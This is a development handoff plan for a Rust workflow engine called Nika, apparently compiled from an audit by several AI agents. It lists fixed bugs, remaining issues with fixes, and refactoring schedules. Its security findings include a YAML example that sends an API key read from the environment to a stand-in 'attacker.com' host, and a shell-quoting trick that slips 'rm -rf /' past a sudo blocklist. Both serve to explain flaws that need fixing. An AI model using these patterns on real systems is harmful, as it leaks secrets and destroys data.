# Handoff Plan — v0.59

> Comprehensive audit results from v0.58. 8 specialized agents (rust-pro ×2, rust-architect,
> rust-security, CLI audit, workflow E2E, code review, architecture review).
> Each issue has: root cause with exact file:line, fix plan with code, verification steps.

## What Was Fixed This Session (12 bugs, 1 security fix)

| Commit | Fix | Severity |
|--------|-----|----------|
| `7b73cc5` | L3 retry uses compiled_schema for from_example | HIGH |
| `7b73cc5` | strict+from_example: L0 uses json_to_schema_strict | MEDIUM |
| `7b73cc5` | Vision+structured: output validated through L2-L4 | MEDIUM |
| `7b73cc5` | enable_tool_injection:false actually skips L0 | MEDIUM |
| `7b73cc5` | preserve_order (serde_json IndexMap workspace-wide) | MEDIUM |
| `7b73cc5` | reorder_keys_like_example post-validation | MEDIUM |
| `7b73cc5` | Early bailout for missing/invalid from_example files | MEDIUM |
| `f9f064f` | L0a/L0b guardrails bypass (were skipped) | HIGH |
| `f9f064f` | Hardcoded "ollama" API key → "no-key" + debug log | HIGH |
| `f9f064f` | .expect() → graceful error on semaphore + retry loop | MEDIUM |
| `f9f064f` | Standalone reorder_keys for file-based from_example | MEDIUM |
| `734afeb` | provider test exit code (type mismatch: Result<String> vs Result<()>) | HIGH |
| `02f017f` | Canonical provider names in `nika new` + help text | MEDIUM |
| `0913601` | **SECURITY**: path traversal in from_example/schema files | HIGH |

---

## Remaining Issues — Priority Order

| # | Issue | Severity | Effort | Type |
|---|-------|----------|--------|------|
| **S2** | $env.* unrestricted access | MEDIUM | M | Security |
| **S3** | Trace secret redaction gaps | MEDIUM | M | Security |
| **S4** | Shell blocklist bypass via quoting | LOW | S | Security |
| **1** | fetch 404 returns exit 0 | HIGH | S | Bug |
| **2** | fail_fast:false partial results blocked | HIGH | M | Logic |
| **3** | $env.MISSING fails before default() | HIGH | M | Binding |
| **4** | workflow graph duplicate edges | LOW | S | Display |
| **5** | {{skills.NAME}} not resolved in templates | MEDIUM | M | Feature |
| **6** | CLI inconsistencies (10 items) | LOW-MED | M | UX |
| **7** | NikaError 103-variant god enum | LOW | L | Refactor |
| **8** | runner.rs run() 1580 lines | LOW | L | Refactor |

---

## Security Findings

### S2: $env.* unrestricted access (MEDIUM)

**File**: `resolve.rs:804-821`

`$env.*` reads ANY env var. A workflow can exfiltrate secrets:
```yaml
with: { key: $env.ANTHROPIC_API_KEY }
fetch: { url: "https://attacker.com/steal?key={{with.key}}" }
```

Mitigating factor: workflow author = user. Only a risk for untrusted YAML.

**Fix**: Block known sensitive vars (`SSH_AUTH_SOCK`, `GPG_AGENT_INFO`) at binding resolution. Log all `$env` accesses at INFO level.

### S3: Trace secret redaction gaps (MEDIUM)

**Files**: `resolve.rs:446-474`, `util/mod.rs:23+`

Pattern-based redaction misses custom API keys (ElevenLabs, xAI). Env-sourced bindings are tracked but value-based redaction only covers known patterns (`sk-proj-*`, `sk-ant-*`, Bearer tokens).

**Fix**: For bindings marked `env_sourced`, track the resolved value string and redact it wherever it appears in traces (value-based, not just pattern-based).

### S4: Shell blocklist bypass via quoting (LOW)

**File**: `security.rs:358-388`

`su""do rm -rf /` in `shell: true` bypasses `sudo` pattern. NFKC normalization handles Unicode but not shell quoting.

**Fix**: Strip shell quoting (`""`, `''`, `\`) before blocklist comparison.

### Positive Security Findings (no action needed)

- SSRF: defense-in-depth with DNS pinning — EXCELLENT
- Template injection: 3-pass isolation with trusted path sets — EXCELLENT
- CRLF header injection blocked, response size limits enforced (50MB/100MB)
- Unicode NFKC normalization, shell hardcoded to `sh -c`
- `cwd` traversal blocked, library injection env vars blocked
- `kill_on_drop(true)`, `unsafe_code = "deny"` workspace-wide

---

## 1. fetch 404 returns exit 0 silently

### Root Cause

`fetch.rs:557` — NO distinction between 200 and 404. Decision tree:
- 5xx / 429 → retry → `Err(FetchError)`
- **ALL other statuses** → fall through as "success"

Per-mode behavior on 404:
- `response: binary` — Already fails (line 597). **Correct.**
- `response: full` — Returns `{"status": 404, ...}`. Status visible. **Correct.**
- Default — Returns 404 HTML as task output. **BUG.**
- `extract: *` on 404 → parses error page. Returns garbage.

No double retry risk (runner.rs:1137 skips task-level retry for fetch).
Existing test `wiremock_fetch_404_returns_body` asserts buggy behavior.

### Fix

**File**: `tools/nika-engine/src/runtime/executor/fetch.rs` (~line 557)

```rust
if !response.status().is_success() && !response.status().is_redirection() {
    if fetch.response != Some(ResponseMode::Full) {
        return Err(NikaError::FetchError {
            reason: format!("HTTP {} {} for URL: {}",
                status.as_u16(), status.canonical_reason().unwrap_or("Unknown"), final_url),
        });
    }
}
```

**What would break**: APIs returning useful JSON on 4xx. Consider `allow_error_status: true` flag later.

**Verify**: `nika fetch https://httpstat.us/404` → exit 1. `--response full` → exit 0.

---

## 2. fail_fast:false partial results blocked downstream

### Root Cause

`runner.rs:2786-2811` — for_each parent marked `TaskResult::failed()` even when some iterations succeed. `get_ready_tasks()` (line 473) checks `is_completed_successfully()` → `false` → NIKA-026 blocks all dependents.

**Key detail**: `result.output` IS already set with partial data at line 2809. Downstream just can't reach it.

### Fix (Option C from rust-architect — `is_usable()`)

**Files**: `run_context.rs` (TaskOutcome), `runner.rs` (aggregation + ready check)

```rust
// run_context.rs
pub enum TaskOutcome {
    Success,
    PartialSuccess { error_summary: String, succeeded: u32, failed: u32 },
    Failed(String),
    DependencyFailed { dependency: String },
    Skipped { reason: String },
}

impl TaskResult {
    pub fn is_usable(&self) -> bool {  // dependency gating
        matches!(self.status, TaskOutcome::Success | TaskOutcome::PartialSuccess { .. })
    }
    pub fn is_success(&self) -> bool {  // strict checks (artifacts, records)
        matches!(self.status, TaskOutcome::Success)
    }
}
```

**Surgical changes** (~5-6 lines):
1. `run_context.rs`: Add `PartialSuccess` + `is_usable()`
2. `runner.rs:470`: `is_completed_successfully` → call `is_usable()`
3. `runner.rs:2786`: Use `PartialSuccess` when `!fail_fast && any_success`

**Output for failed iterations**: `Value::Null` (preserves index alignment).

---

## 3. $env.MISSING fails before default() can apply

### Root Cause

`resolve.rs:658-676` — Transform dispatch:
```rust
match (&raw_value, &entry.transform) {
    (Some(v), Some(expr)) if !v.is_null() => { /* apply */ }
    (Some(v), Some(expr)) if v.is_null() => { /* try apply */ }
    _ => raw_value,  // ← None + Some(transform) hits HERE
};
```

`None` from `resolve_binding_path` (missing env var) matches the `_` catch-all. Transforms including `default()` never fire. Then Step 4 throws NIKA-052.

`??` works because it's in `entry.default` (Step 4 fallback), not the transform chain.

### Fix (targeted `has_default()` — from rust-pro)

**Files**: `nika-core/src/binding/transform.rs`, `nika-engine/src/binding/resolve.rs:658-676`

```rust
// transform.rs
impl TransformExpr {
    pub fn has_default(&self) -> bool {
        self.ops.iter().any(|op| matches!(op, TransformOp::Default(_)))
    }
}

// resolve.rs:658-676 — add new arm before `_`:
(None, Some(expr)) if expr.has_default() => {
    match expr.apply(&Value::Null) {
        Ok(result) => Some(result),
        Err(_) => None,  // fall through to NIKA-052
    }
}
```

**Preserves**: `$env.MISSING` → NIKA-052. `$env.MISSING | upper` → NIKA-052. `$env.MISSING | default("x") | upper` → "X". `$env.SET | default("x")` → SET value.

---

## 4. workflow graph duplicate edges

### Root Cause

`workflow.rs:128-138` — `edges()` collects from `depends_on` only. But during DAG construction (`flow.rs:492-573`), implicit edges from `with:` bindings also exist. The graph command shows both without dedup.

### Fix

Use the analyzed DAG's deduplication (`flow.rs` line 492 `seen_edges: FxHashSet`) instead of raw `workflow.edges()`. Or deduplicate in the graph command with `HashSet`.

---

## 5. {{skills.NAME}} not resolved in templates

### Root Cause

`BindingSource` enum has no `Skills` variant. Skills are injected into agent system prompts only (executor/agent.rs), not available as template variables. `{{skills.pirate}}` is treated as `TemplateExpr::Alias { path: "skills.pirate" }` → alias not found.

### Fix (Option C from rust-architect — thin template resolution, ~60 lines)

No `BindingSource::Skills` variant needed. Skills in `with:` blocks makes no semantic sense.

**Changes across 3 files**:

1. `run_context.rs`: Add `skills: FxHashMap<String, Value>` + `resolve_skills_path()`
2. `template.rs`: Add `Skills { path, transforms }` to `TemplateExpr` + `strip_prefix("skills.")` in parser + pass 4 resolution
3. `runner.rs`: Load skills into RunContext at workflow start

**NOT changed**: resolve.rs, types.rs, agent.rs (agent injection path unchanged).

---

## 6. CLI Inconsistencies (10 items from CLI audit)

| # | Issue | Severity | File |
|---|-------|----------|------|
| C1 | `check --strict` drops providers line | MED | nika-cli/src/ |
| C2 | `invoke --list` omits core/file/introspection tools (shows 24, actual ~42) | MED | nika-cli/src/ |
| C3 | `nika new` ignores path argument, creates in CWD | LOW | nika-cli/src/new_cmd.rs |
| C4 | Schema version suggestion wrong (`@0.9` instead of `@0.12`) | LOW | nika-core/src/ast/ |
| C5 | `dry-run` cost estimate shows $0.0165 for mock provider | LOW | nika-engine/src/ |
| C6 | `cache stats` shows `$-0.0000` (negative zero) | TRIVIAL | nika-cli/src/ |
| C7 | `help` says "schema list" but command is "schema version" | LOW | nika/src/main.rs |
| C8 | Transform count discrepancy (help: 31, listed: 29, docs: 38) | LOW | help text |
| C9 | Builtin tool count discrepancy (help: 24, actual: ~42) | LOW | help text |
| C10 | Provider display shows `gpt-4o` instead of `gpt-4.1` in early trace | LOW | nika-engine/src/display/ |

---

## 7. Workflow E2E Inconsistencies (5 items)

| # | Issue | Severity |
|---|-------|----------|
| W1 | `extract: article` returns JSON object, not plain text. `trim` fails on objects. | LOW |
| W2 | `format: markdown` stored as `format: "text"` in artifacts.json manifest | LOW |
| W3 | `checksum: null` in artifacts.json for all artifacts | LOW |
| W4 | fetch UTF-8 error on non-UTF8 responses (e.g., google.com ISO-8859-1) | MED |
| W5 | `context:` / `skills:` don't auto-inject into prompts (must use `{{context.NAME}}`) | By design |

---

## 8. NikaError god enum (103 variants)

103 variants, 2,796 lines. 4 scaffolded domain enums in `error_domains.rs` but **zero production callsites** use them.

### Migration order (effort/value)

**Phase 1 — Quick Wins (1-2 days)**: Course(5v), Record(5v), StructuredOutput(4v), Artifact(4v)
**Phase 2 — Complete Scaffolding (2-3 days)**: DagError(+3), ProviderError(+1), ExecutionError(+1), BindingError(+5)
**Phase 3 — New Domains (3-5 days)**: McpError(11v), AgentError(5v), OutputError(3v)
**Phase 4 — Hard Cases (LAST)**: ToolError(83 callsites), ValidationError(75 callsites, needs audit)

---

## 9. runner.rs run() 1580 lines

### Extraction order (dependency-ordered)

```
Phase 1 (leaf, any order):
  compute_dag_depths() | check_pre_flight() | aggregate_for_each_results()

Phase 2 (MUST be first for main loop):
  resolve_for_each_items()  ← free fn, eliminates 372 lines of 4-format duplication

Phase 3 (main loop cleanup):
  expand_decompose_items() | check_completion() | check_cancellation()

Phase 4 (bookends):
  initialize_workflow_context() | finalize_workflow() | initialize_renderer()
```

**Critical insight**: `resolve_for_each_items()` has ~70 lines of verbatim duplication between Format 2 (`$alias.path`) and Format 4 (`{{with.alias.path}}`). Extract this as a free function first.

---

## Execution Timeline

```
Sprint 1 (quick fixes):
  Issue 1 (fetch 404) — 1 commit, 30min
  Issue 4 (graph dedup) — 1 commit, 30min

Sprint 2 (binding + for_each):
  Issue 3 ($env default) — has_default() + match arm — 2 commits, 2h
  Issue 2 (partial results) — PartialSuccess + is_usable() — 3 commits, 3h

Sprint 3 (feature + UX):
  Issue 5 (skills template) — template.rs + run_context + runner — 3 commits, 2h
  Issue 6 (CLI items C1-C10) — 5-8 commits, 3h

Post-launch:
  Issue 8 (NikaError) — 4 phases, 12+ commits, ~5 days
  Issue 9 (runner.rs) — 4 phases, 8 PRs, ~5 days
  Security S2/S3/S4 — 3 commits, 2h
```

## Socratic Questions

1. **fetch 404**: Should `response: full` on 404 set exit code 1? Or only default mode?
2. **partial results**: Failed iterations → `null` or `{"error":"..."}` in the array?
3. **$env default**: Should `$task_that_failed | default("x")` also work? Or only `$env`?
4. **skills**: `{{skills.NAME}}` or `{{context.skills.NAME}}`?
5. **NikaError**: Keep NIKA-XXX codes or introduce domain prefixes (PROV-030)?
6. **runner.rs**: Extracted functions `pub` (testable) or `pub(crate)` (hidden)?
7. **graph**: Distinguish `depends_on` edges from implicit `with:` edges visually?
